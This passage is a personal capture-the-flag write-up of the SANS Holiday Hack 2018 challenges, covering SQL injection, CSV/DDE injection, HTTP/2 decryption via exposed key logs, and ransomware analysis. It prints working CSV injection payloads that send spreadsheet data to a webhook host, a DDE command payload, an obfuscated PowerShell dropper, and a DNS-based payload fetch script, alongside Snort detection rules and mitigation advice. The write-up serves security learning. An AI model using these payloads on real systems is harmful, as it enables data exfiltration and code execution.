Control number in hand, Hans takes it upon himself to disclose to use his _real_ plan. He doesn't aim to free the prisoners, he wants to steal the contents of Santa's vault! I, for one, quite liked my gift from Santa this year, so I suppose we should help stop Hans.

The reason that this works is that the format function directly copies the specified value into the query string wherever _{}_ is. For our winning query, this means that the query submitted to the database was the following:
*SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '' OR ( enabled  = 1 AND '1'='1') AND '1'='1' LIMIT 1*

Such attacks can be prevented by either sanitizing input data before use by escaping or removing characters used in SQL to format queries, or by [parameterizing the input by using the provided functions in a given programming language](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet#Defense_Option_1:_Prepared_Statements_.28with_Parameterized_Queries.29).

### 7) HR Incident Response
>Santa uses an Elf Resources website to look for talented information security professionals. [Gain access to the website](https://careers.kringlecastle.com/) and fetch the document C:\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with "K."

At first glance, the webpage seems pretty straightforward. Applicants input their name, contact information and CSV-formatted work history. Preliminary checks seemed to rule out SQL injection, as each of the text fields has both client side and server side checks. Upon a successful submission, we get the following message:
>Thank you for taking the time to upload your information to our elf resources shared workshop station! Our elf resources will review your CSV work history within the next few minutes to see if you qualify to join our elite team of InfoSec Elves. If you are accepted, you will be added to our secret list of potential new elf hires located in C:\candidate_evaluation.docx

Since we can't seem to get any text-related exploits, and CSV stands out as an odd way of submitting work experience, let's try to [exploit the CSV using the HYPERLINK function](https://payatu.com/csv-injection-basic-to-exploit/). Since I'm too cheap to buy a VPS, and too lazy to allow traffic through my firewall, I'm going to use [a free online webhook](https://webhook.site/) to recieve my exfiltrated data. Using the two methods I am aware of to directly exfiltrate data, I crafted the following payload:
```
=HYPERLINK("https://webhook.site/<id>?data="&A1:A10&B1:B10&C1:C10, "Please click here!")
=IMPORTXML(CONCAT(""https://webhook.site/<id>?data="", CONCATENATE(A1:E1)), ""//a"")
```

After waiting 10 minutes, it seemed to have not worked, which is unfortunate. Since there is a web server running, though, there is at least one publicly accessable directory that I can copy my target file to. My first guess was the default for Windows IIS, _C:\inetpub\wwwroot_. When I checked the initial result, however, the 404 Page states the following:
>Publicly accessible file served from: C:\careerportal\resources\public\ not found......
>Try: https://careers.kringlecastle.com/public/'file name you are looking for'

Nice of their 404 Page to disclose a publically available directory. Using the following payload, after waiting a couple minutes, I browsed to "https://careers.kringlecastle.com/public/test.docx" and downloaded the target file.
```
=CMD|'/C copy C:\\candidate_evaluation.docx C:\\careerportal\\resources\\public\\test.docx'!A0
```

Krampus, who some might recognize as Santa's evil counterpart, is our applicant that was linked to the terrorist organization [Fancy Beaver](https://en.wikipedia.org/wiki/Fancy_Bear).

Having helped the elves identify the organization seems to have brought Hans' plot to a screeching halt.

CSV injection is a powerful and common vulnerability. As we saw, it can be used to directly exfiltrate data from a spreadsheet, or execute arbitrary commands. To mitigate it, as with most injection vulnerabilities, requires input sanitation. There are four key characters, +,-,+,@, that, when seen, should be prefixed with one single quote ('), as doing so prevents Excel and other spreadsheet software from interpreting that cell as a formula. Additionally, registry keys should be modified in accordance with [Microsoft Security Advisory 4053440](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2017/4053440) to prevent auto-execution of Dynamic Data Exchange links. The final piece of the puzzle is, as always, user education, as, with the previous two controls in place, the user should, at the very least, be prompted to confirm that they would like to execute the DDE object. A properly educated user will know that such requests are not normal for Microsoft Office documents, decline the prompt, and at the very least delete the offending document from their computer.

[Link to Relevant Kringlecon Talk](http://www.youtube.com/watch?v=Z3qpcKVv2Bg)

### 8) Network Traffic Forensics
>Santa has introduced a web-based packet capture and analysis tool at [https://packalyzer.kringlecastle.com](https://packalyzer.kringlecastle.com) to support the elves and ton bheir information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball?

This challenge took me a full week to figure out. I dove pretty deep, but after 3 full evenings, I took a step back and did challenge 9, then came back to it. Here is my *sucessful* method.

Upon browsing to the web page, we're greeted with a fairly standard login page. After attempting basic SQL injection with no luck, I clicked the link to register a new account. Again, failing to inject the input, I registered an arbitrary username. In my case, "administrator", hoping to get lucky and be able to use the registration page to change the password for a legitimate admin. That done, I logged into the application using my new account.

Of immediate interest to me was that I could upload files; This is a very common attack vector. Knowing that there was probably some form of clientside validation on upload that I would need to bypass at a minimum, I crawled through the web page source for the upload logic, finding the following:
```
//File upload Function. All extensions and sizes are validated server-side in app.js
$(function () {
    'use strict';
    $('#fileupload').fileupload({
        url: '/api/upload',
        dataType: 'json',
        done: function (e, data) {
            if (data.result.request) {
                analyze_packets(data.result.data.clean(""));
            } else {
                Materialize.toast('<text style="color: #f44336">'+data.result.data+'</text>', 8000);
            }
            setTimeout(function(){
                $('#progress-level').css(
                    'width',
                    '0%'
                );
                $('#upload_traffic_button').removeClass('disabled');
                $('#sniff_traffic').prop('disabled', false);
            },2000);
        }
...
```

Well, that comment would seem to indicate that there is some serverside validation going on. If possible, I'd like to see the serverside code. Given that all of the other javascript files were hosted at _/pub/js/<file>_, I browsed [to that](https://packalyzer.kringlecastle.com/pub/app.js), successfully getting the server-side code. I've gone ahead and extracted the juicy bits below:
```
const dev_mode = true;
const key_log_path = ( !dev_mode || __dirname + process.env.DEV + process.env.SSLKEYLOGFILE )
const options = {
  key: fs.readFileSync(__dirname + '/keys/server.key'),
  cert: fs.readFileSync(__dirname + '/keys/server.crt'),
  http2: {
    protocol: 'h2',         // HTTP2 only. NOT HTTP1 or HTTP1.1
    protocols: [ 'h2' ],
  },
  keylog : key_log_path     //used for dev mode to view traffic. Stores a few minutes worth at a time
};
...
function load_envs() {
  var dirs = []
  var env_keys = Object.keys(process.env)
  for (var i=0; i  env_keys.length; i++) {
    if (typeof process.env[env_keys[i]] === "string" ) {
      dirs.push(( "/"+env_keys[i].toLowerCase()+'/*') )
    }
  }
  return uniqueArray(dirs)
}
if (dev_mode) {
    //Can set env variable to open up directories during dev
    const env_dirs = load_envs();
} else {
    const env_dirs = ['/pub/','/uploads/'];
}
```

The top segment is interesting because it tells me that developer mode is on, and that the server is, in fact, logging the keys needed to decrypt HTTPS. The bottom segment tells me that every environment variable, to include the two we now know we care about, _DEV_ and _SSLKEYLOGFILE_, are valid directories.)

Browsing to [/DEV/](https://packalyzer.kringlecastle.com/DEV/) gives us the following error:
>Error: EISDIR: illegal operation on a directory, read
This confirms that it is a valid, web-accessable directory, even if we can't easily get a listing of the directory.

Browsing to [/SSLKEYLOGFILE/](https://packalyzer.kringlecastle.com/SSLKEYLOGFILE/) gives us the following error:
>Error: ENOENT: no such file or directory, open '/opt/http2packalyzer_clientrandom_ssl.log/'

Now that I know both a way to access and the name of the file, I navigated to [/DEV/packalyzer_clientrandom_ssl.log](https://packalyzer.kringlecastle.com/DEV/packalyzer_clientrandom_ssl.log), successfully downloading keys.

Now knowing that I can get the keys I need, I used the supplied functionality in the web app to sniff, then download the PCAP of the sniff. Once that was complete, I revisted the above link to download up-to-date keys.

Using WireShark, I opened the PCAP, then navigated to Edit->Preferences->Protocols->SSL, and provided the key log as the "(Pre)-Master-Secret log file". With this done, I can now see plaintext credentials for a handful of elves as they log in.
```
{"username": "bushy", "password": "Floppity_Floopy-flab19283"}
{"username": "alabaster", "password": "Packer-p@re-turntable192"}
{"username": "pepper", "password": "Shiz-Bamer_wabl182"}
```

Those are some secure passwords, if only I didn't have plaintext access to them..

Alabaster Snowball is one of our targets, and a systems administrator of the network, so I logged in as him. He has one PCAP available for download, named *super_secret_packet_capture*, so I downloaded and opened it.

The only traffic captured was an email between our two targets, Holly and Alabaster. The email had an attachment, which, [as is effectively required in SMTP](https://superuser.com/questions/402193/why-is-base64-needed-aka-why-cant-i-just-email-a-binary-file), is base64 encoded. Using [CyberChef](https://gchq.github.io/CyberChef/), I quickly and easily converted the attachment to it's raw form, a PDF, and opened it in a sandbox. The last line of the PDF is the following:
>We’ve just taken Mary Had a Little Lamb from Bb to A!

Thus, the answer to the question posed is: "Mary Had a Little Lamb."

Responsible information management is always a very complex thing to manage, especially because the effects of distributed computing is acutely felt when trying to mitigate the risk of improper disclosure. For the specific vulnerability presented in this challenge, my future reccomendation to the compromised company would be to never allow a developer to have administrative accounts on production systems. This would make it less likely that developer features are running in production.
Additionally, I would reccommend that the systems administrator keep a closer eye on what files are in published directories, as it would have been nearly impossible to do this attack without being able to read the server-side javascript.

[Link to full CyberChef recipie](https://gchq.github.io/CyberChef/#recipe=Remove_whitespace(true,true,true,true,true,true)From_Base64('A-Za-z0-9%2B/%3D',true))

[Link to Relevant KringleCon Talk - Web App Hacking](http://www.youtube.com/watch?v=80LW_pM0SqU)

[Link to Relevant KringleCon Talk - HTTP2 Decryption](https://www.youtube.com/watch?v=YHOnxlQ6zec)

### 9) Ransomware Recovery
>Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks.

This challenge is unique, in that it is actually four distinct parts.

The first challenge, titled **Catch the Malware**, gives us the following prompt:
>Assist Alabaster by building a Snort filter to identify the malware plaguing Santa's Castle.

Opening the the shell on the Snort sensor gives us the following message:
```
  Kringle Castle is currently under attacked by new piece of
  ransomware that is encrypting all the elves files. Your
  job is to configure snort to alert on ONLY the bad
  ransomware traffic.
...
  Create a snort rule that will alert ONLY on bad ransomware
  traffic by adding it to snorts /etc/snort/rules/local.rules
  file. DNS traffic is constantly updated to snort.log.pcap
...
  This sensor also hosts an nginx web server to access the
  last 5 minutes worth of pcaps for offline analysis. These
  can be viewed by logging into:

  http://snortsensor1.kringlecastle.com/

  Using the credentials:
  ----------------------
  Username | elf
  Password | onashelf
```

So, our task is to write a Snort rule to detect malicious DNS tunneling. We are also given a way to download PCAP for the past 5 minutes for local analysis.

[After reading a paper on detecting DNS tunneling](https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152), I set about creating my rule.

The first thing I noticed in the downloaded PCAPs about the abnormal DNS traffic was that it always had a data size of greater than 50. Next, I noticed was that every request always had the string "77616E6E61636F6F6B69652E6D696E2E707331". Given that, I tried the following rule:
```
alert udp any any -> any 53 (msg:"Wannacookie Stuff"; dsize: > 50; content:"77616E6E61636F6F6B69652E6D696E2E707331"; sid:40000007)
```
After waiting approximately 30 seconds, the terminal gave me a message informing me that Snort was still not alerting on all ransomware. After about 10 minutes of back and forth, I came to the conclusion that the scoring engine was expecting alerts for both the DNS query and the response, so I tried the following:
```
alert udp any any -> any 53 (msg:"Wannacookie Stuff - Orig"; dsize: > 50; content:"77616E6E61636F6F6B69652E6D696E2E707331"; sid:40000007)
alert udp any 53 -> any any (msg:"Wannacookie Stuff - Resp"; dsize: > 50; content:"77616E6E61636F6F6B69652E6D696E2E707331"; sid:40000008)
```
After about 30 seconds, I recieved the following message
>[+] Congratulation! Snort is alerting on all ransomware and only the ransomware!

This rule, however, is not enterprise ready. Let's soup it up a bit, then dissect why I did what I did.
```
alert udp any any -> any 53 (msg:"Wannacookie Stuff - Orig"; dsize: > 50; content:"|01 00|"; offset: 2; depth: 4; content:"77616E6E61636F6F6B69652E6D696E2E707331"; nocase; offset: 12; depth: 70; sid:40000007)
alert udp any 53 -> any any (msg:"Wannacookie Stuff - Resp"; dsize: > 50; content:"|84 00|"; offset: 2; depth: 4; content:"77616E6E61636F6F6B69652E6D696E2E707331"; nocase; offset: 12; depth: 70; sid:40000008)
```

The first check is for payload size. The reason this check is first is because it is the most computationally easy, reducing the need to further process packets that we know don't meet our signature. The second check is for the DNS query flags, which start 2 bytes into the payload, and terminate two bytes later, giving us an offset range of 2-4. The last check is for our "magic" string. This check is not case sensitive, begins 12 bytes into the payload, and terminates at 70 bytes into the payload.

The second challenge, titled **Identify the Domain**, asks us to determine what domain [the malware sample](https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip) is communicating with. The password to the zip archive, if you're following along, is _elves_.

After decompressing both the .zip archive and the sample itself (if you didn't know, [DOCX files are a bunch of XML documents compressed together](https://www.loc.gov/preservation/digital/formats/fdd/fdd000397.shtml)), I easily identified _word/vbaProject.bin_ as the likely source of malicious activity, as VB Script macros are a known malware technique. As this file should not be compressed, I did the following:
```
micrictor@laptop:~/Documents$ strings vbaProject.bin
...
powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C "sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"
...
powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C "sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"
...
```
I've truncated the output, as I recognized that a word document macro spawning a powershell instance is probably the malware. Now, I just have to decode what is actually being ran.

Using [CyberChef](https://gchq.github.io/CyberChef/), I made quick work of the encoded string. Reading through it, I recognized that the string was first being converted from base64, then being un-deflated, also known as inflated. Using [my final recipie](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Raw_Inflate(0,0,'Adaptive',false,false)&input=bFZIUlNzTXdGUDJWU3drc1lVdG9Xa3h4WTRpeWlyNG9hQitFTVVZb3FRMXN5VWpUb1hUN2QyLzFaYjRwRjVKRHp1R2NlMithM3RYUmVnY1AyUzBsbXNGQS9BS0lCdDRkZGpiQ2hBckJKbkNDR3hpQWJPRU1pQnNmU2wyM01LenJWb2NOWGRmZUhVMkltL2s4ZXV1aVZKUnNaMUl4ZHI1VUV3OUx3R09LUnVjRkJCUDc0UEFCTVdtUVNvcENTVlZpU1pXcmU2dzdkYTJ1c2xLdDhDNnpza2lMUEpjSnl0dFJqZ0M5emVoTmlRWHJJQlhpc3BuS1A3cVlaNVMrbU03dmpvYXZYUGVrOXdiNHF3bW9BUk44YTJLalhTOXF2d2YrVFNha0ViK0pCSGoxZVRCUXZWVk1kREZZOTk3TlFLYU1Telp1cklYcEV2NGJZc1dmY25BNTFueFFRdkdEeHJsUDhOeEgva015OWdYUkVvaEc)  gave me the highest registered domain being used by the malware, _erohetfanu.com_.

The third challenge, titled **Stop the Malware**, tasks us with determining the [killswitch domain](https://www.wired.com/2017/05/accidental-kill-switch-slowed-fridays-massive-ransomware-attack/) for our sample, then [registering that domain](https://hohohodaddy.kringlecastle.com/index.html) to stop all future attacks by this malware.

First off, we're going to have to execute the dropper, in a controlled manner, in order to take a look at the payload. Given the previously linked CyberChef output, I generated the following bash script to emulate the same functionality, then input the hex characters from _output.txt_ into CyberChef, allowing me to view the payload.
```
iter_var=$(nslookup -type=txt 77616E6E61636F6F6B69652E6D696E2E707331.erohetfanu.com erohetfanu.com | awk '/".*"/ {print $4}' | sed 's/\"//g')
for i in `seq 0 $iter_var`;
do
    nslookup -type=txt "$i.77616E6E61636F6F6B69652E6D696E2E707331.erohetfanu.com" erohetfanu.com | awk '/".*"/ {print $4}' | sed 's/\"//g' >> output.txt;
done
```

This yielded a script with no whitespace, making it very hard to read. For my own well-being, I used [beautifier.io](https://beautifier.io/) to allow me to read the source code. Of interest was the first three lines in the entrypoint, _wanc_, which I expanded below for readability:
```
$S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
if ($null -ne(   (Resolve-DnsName -Name
            $(H2A
                $(B2H
                    $(ti_rox
                        $(B2H
                            $(G2B
                                $(H2B $S1)
                            )
                        )
                        $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com - Type TXT).Strings
                    )
                )
            ).ToString() -ErrorAction 0 - Server 8.8.8.8)
        )
    )

{_
    return
};
```
This conditional is most definitely a killswitch, as the sucessful resolution of a domain name results in the termination of execution. Now, all we have to do is work backwards until we get there.

First off, we convert the supplied string from hex to binary, then ungzip it, then convert it back to hex, yielding _1f0f0202171d020c0b09075604070a0a_, all courtesy of CyberChef.
Next, we should DNS lookup 6B696C6C737769746368.erohetfanu.com with the supplied parameters. This yields _66667272727869657268667865666B73_.
Now, we will bitwise XOR the two values we have thusfar, as that is all that the *ti_rox* function does. With that complete, we convert the result to hex, then ascii, which results in _yippeekiyaa.aaay_, our killswitch domain.

That domain name is awfully similar to a password I remember finding while I was helping another elf...

After registering it, we get the following message:
>Successfully registered yippeekiyaa.aaay!

[Here is a link the complete CyberChef recipie, with XOR key loaded in.](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Gunzip()XOR(%7B'option':'Hex','string':'66667272727869657268667865666B73'%7D,'Standard',false)To_Hex('None')From_Hex('Auto'))

The fourth, and final, challenge, **Recover Alabaster's Password**, asks us to, given a PowerShell process dump and an encrypted file, decrypt the file and get Alabaster's password.

Of interest for this challenge are the following code segments:
```
$pub_key = [System.Convert]::FromBase64String($(get_over_dns("7365727665722E637274") ) )
$Byte_key = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''))  | ? {$_ -ne 0x00})
$Hex_key = $(B2H $Byte_key)
$Key_Hash = $(Sha1 $Hex_key)
$Pub_key_encrypted_Key = (Pub_Key_Enc $Byte_key $pub_key).ToString()
...
enc_dec $Byte_key $future_cookies $true
Clear-variable -Name "Hex_key"
Clear-variable -Name "Byte_key"
```

As we can see, first, our malware downloads a public key, _7365727665722E637274_, or _server.crt_. It then generates a random 16-byte key, then encrypts it using the previously grabbed public key. We see that, later on in the program, the key is used to encrypt files, then immediately cleared from memory.

What this means for us is that we're going to have to get, then somehow decrypt, that encrypted key, as it is the only version of the key available to us.

As per the hint given to us by Alababaster after finding the killswitch domain, I'll be using [Power Dump](https://github.com/chrisjd20/power_dump) to get the encrypted key out of memory.

Using the variable search parameter *len == 512*, we only get one result, shown below:
```
: print
3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671
d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e4577
6d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971
...
```
ASCII-encoded hex in hand, I used _xxd -r_ to encode it and save it to *enc_key.raw*.

Now, to somehow get the private key.

After many hours of trying and failing to derive the private key from the public key given that I now have a known ciphertext and a known public key, I decided that I was probably in too deep, and needed to look at the problem a different way. I accomplished this with my good friend Jim Beam.

Given that modular arithmetic and prime factorization did nothing but hurt my brain, I turned my attention to the only other malicious system known to us; The DNS server at _erohetfanu.com_. Realizing that the malware is just requesting the name of a file, hex encoded, I utilized the Wannacookie function *get_over_dns* to get arbitrary filenames for me. After failing at path traversal and command injection, I figured, what the hell, let's see if I can grab *server.key*, the default name for a private key.

It worked.

With a private key and a ciphertext, OpenSSL made short work of decrypting our AES key.
```
micrictor@laptop:~/Documents/sansholiday/ch9$ openssl rsautl -decrypt -inkey dnstun-sploit/priv.key -in enc_key.raw -out key.raw -oaep
micrictor@laptop:~/Documents/sansholiday/ch9$ ls -la
total 417852
drwxrwxr-x 4 micrictor micrictor      4096 Jan  7 21:15 .
drwxrwxr-x 5 micrictor micrictor      4096 Jan  4 20:55 ..
-rw-rw-r-- 1 micrictor micrictor     16420 Nov  9 07:25 alabaster_passwords.elfdb.wannacookie
-rw-rw-r-- 1 micrictor micrictor       256 Jan  7 21:00 enc_key.raw
-rw-rw-r-- 1 micrictor micrictor       513 Jan  7 21:00 enc_key.txt
-rw-rw-r-- 1 micrictor micrictor        16 Jan  7 21:16 key.raw
```

16 bytes, just like our original key.

Now, at this point, as I look back, Jim Beam may have advised me to do this the long way. Instead of just using the WannaCookie decryption function, I rolled my own in Bash.

Relevant code is below:
```
if ($enc_it) {
    $AESP.GenerateIV();
    $FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length), 0, 4);
    $FileSW.Write($AESP.IV, 0, $AESP.IV.Length);
    $Transform = $AESP.CreateEncryptor()
} else {
    [Byte[]] $LenIV = New - Object Byte[] 4;
    $FileSR.Seek(0, [System.IO.SeekOrigin]::Begin) | Out - Null;
    $FileSR.Read($LenIV, 0, 3) | Out - Null;
    [Int] $LIV = [System.BitConverter]::ToInt32($LenIV, 0);
    [Byte[]] $IV = New - Object Byte[] $LIV;
    $FileSR.Seek(4, [System.IO.SeekOrigin]::Begin) | Out - Null;
    $FileSR.Read($IV, 0, $LIV) | Out - Null;
    $AESP.IV = $IV;
    $Transform = $AESP.CreateDecryptor()
};
```

Interesting. So, for our decryptor to work, we're first going to have to perform the same logic to get the IV. I'm going to do so manually.
```
micrictor@laptop:~/Documents/sansholiday$ hexdump alabaster_passwords.elfdb.wannacookie | head
0000000 0010 0000 981f 13ac 87b1 91f7 42ab 4bb2
0000010 7fcd 55ed 30f1 237a f95b 08e9 338a db80
0000020 872c dec4 433b a86d e5df 73af f749 3d00
0000030 94d2 5bfc 57a7 dd4f d032 a050 481f e4d5
0000040 fb8d 0884 572e 5d4f 84ff 9aca e84a 961c
0000050 dd1e 844b cd7e deeb 3c67 03f6 b3f4 8d3b
0000060 4f46 f525 5cfb a21f e39c 02b4 66f2 445c
0000070 7523 c3fc a660 401e e7dc c62c 3b7d fdaa
0000080 03f1 b8e5 295d 7bfd 5a04 b331 de27 ff60
0000090 87b4 1e94 c7cd 1308 b8d2 b962 e18a fa48
```
As you can see from the hex dump, the first 4 bytes are "0010 0000", which is 16(little endian). So, the next 16 bytes are the IV, or _981f13ac87b191f742ab4bb27fcd55ed_.

Now we need to remove the leading 20 bytes, then decrypt the result.
```
micrictor@laptop:~/Documents/sansholiday/ch9$ dd if=./alabaster_passwords.elfdb.wannacookie of=alabaster_passwords.elfdb.enc bs=1 skip=20
micrictor@laptop:~/Documents/sansholiday/ch9$ openssl aes-128-cbc -d -nosalt -iv 981f13ac87b191f742ab4bb27fcd55ed -K fbcfc121915d99cc20a3d3d5d84f8308 -in alabaster_passwords.elfdb.enc -out alabaster_passwords.elfdb
micrictor@laptop:~/Documents/sansholiday/ch9$ strings alabaster_passwords.elfdb
...
alabaster.snowballED#ED#EED#EF#G#F#G#ABA#BA#Bvault>
C/)alabaster@kringlecastle.comChristMasRox19283www.reddit.com?
C3'alabaster@kringlecastle.comWoootz4Cookies19273www.4chan.org@
C+1alabaster@kringlecastle.comYayImACoder1926www.codecademy.com?
C7#alabaster@kringlecastle.comPetsEatCookiesTOo@813neopets.com
alabaster.snowball0912783162016123vault:
17+alabaster.snowballMoarCookiesPreeze1928Barcode Scanner:
C-#alabaster@kringlecastle.comCookiesRLyfe!*26netflix.comF
C=+alabaster@kringlecastle.comKeepYourEnemiesClose1425www.toysrus.com5
1+-alabaster.snowballCookiesR0cK!2!#active directory
```
And there we have it, Alabaster's vault password is "ED#ED#EED#EF#G#F#G#ABA#BA#B", which, he tells us, is a Rachmaninoff piece.

[Link to Relevant KringleCon Talk](http://www.youtube.com/watch?v=wd12XRq2DNk)

### 10) Who Is Behind It All?

Now, we must try to get into the vault. Attempting to use the password we just recovered gave us an "Off-Key" error. As I can't be bothered to learn musical theory, I just wrote the following script to brute force what key it is in.

```python
notes=['A', 'Ash', 'B', 'C', 'Csh', 'D', 'Dsh', 'E', 'F', 'Fsh', 'G', 'Gsh', 'A', 'Ash', 'B', 'C', 'Csh', 'D', 'Dsh', 'E', 'F', 'Fsh', 'G', 'Gsh', 'A', 'Ash', 'B', 'C', 'Csh', 'D', 'Dsh', 'E', 'F', 'Fsh', 'G', 'Gsh']
start=[19,18,19,18,19,19,18,19,21,23,21,23,12,14,13,14,13,14]

for x in range(0,6):
   for y in start:
     trykey+=notes[y-x]
   os.system("curl 'https://pianolock.kringlecastle.com/checkpass.php?i=" + trykey + "'")
   trykey = ""


for x in range(0,6):
   for y in start:
     trykey+=notes[y+x]
   os.system("curl 'https://pianolock.kringlecastle.com/checkpass.php?i=" + trykey + "'")
   trykey = ""
```

This, in about 5 seconds, gave us a successful result with the key "DCshDCshDDCshDEFshEFshGAGshAGshA", corresponding to converting Alabaster's music, which is in C Minor, to A Major.

Walking into Santa's vault we find... Santa? I guess that shouldn't be as suprising to me as it is. When you ask him what's up, he explains that this whole ordeal was just him testing up to make sure we were up to the challenge of defending the North Pole's network.

Ho Ho Ho indeed, Santa.


### CTF Conclusion

This year's hack challenge had an appealing mix of challenges, covering everything from penetration testing CLI tools, web applications, and Node.js applications (a new one for me), searching for intelligence in git repositories, and conducting forensic analysis and incident response on a malware infection. It was challenging in all the right areas, and not overly contrived. I will definitely come back next year!